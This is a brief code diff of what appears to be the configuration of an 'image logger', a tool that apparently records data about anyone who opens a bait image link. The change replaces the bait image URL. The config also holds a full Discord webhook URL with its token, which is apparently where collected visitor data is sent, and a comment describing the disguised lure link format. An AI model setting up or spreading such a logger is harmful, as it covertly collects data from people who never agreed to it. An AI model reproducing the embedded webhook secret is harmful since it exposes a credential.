@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": https://discord.com/api/webhooks/1502991786065264741/HJ5-Frtivd1_YQmoKkJkIwg-uxi1yEJcrB88r_MPfTVQ6wUoyJGhKIahoKZiZXXeIKfO
-    "image": https://nl.pinterest.com/pin/688910074240776070/
+    "image": https://www.rd.com/article/find-the-hidden-objects/
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
